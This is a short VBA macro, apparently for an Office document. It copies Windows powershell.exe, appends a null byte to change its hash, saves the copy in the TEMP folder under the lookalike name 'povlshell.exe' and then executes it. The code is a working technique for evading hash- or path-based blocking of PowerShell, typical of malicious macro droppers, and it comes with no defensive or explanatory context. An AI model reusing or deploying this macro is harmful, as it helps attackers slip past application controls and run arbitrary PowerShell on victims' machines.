Sub AddNull()

   'Variables
    Dim Filename As String
    Dim Bytearray() As Byte
    Filename = "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
    
    'Create ADODB object
    Dim bin
    Set bin = CreateObject("ADODB.Stream")
    bin.Type = 1
    bin.Open
    'Read the .exe as a Bytearray
    bin.LoadFromFile Filename
    Bytearray = bin.Read
    
    'Close the stream for now
    bin.Close

    'Change the Bytearray (and MD5 sum) by adding a null byte
    Dim Arraylength As Long 'Count the array
    Arraylength = UBound(Bytearray, 1) - LBound(Bytearray, 1) + 1 'stretch the array by 1
    ReDim Preserve Bytearray(Arraylength)
    Bytearray(Arraylength) = 0 'add null byte
    
    'Write a new .exe file
    bin.Open
    bin.Write Bytearray
    Dim newFilename As String
    Dim dir As String
    Dim name As String
    dir = Environ("TEMP")
    name = "povlshell.exe"
    newFilename = dir & "\\" & name
    bin.SaveToFile newFilename, 2
	
	Dim retval 
	retval = Shell(newFilename)

End Sub
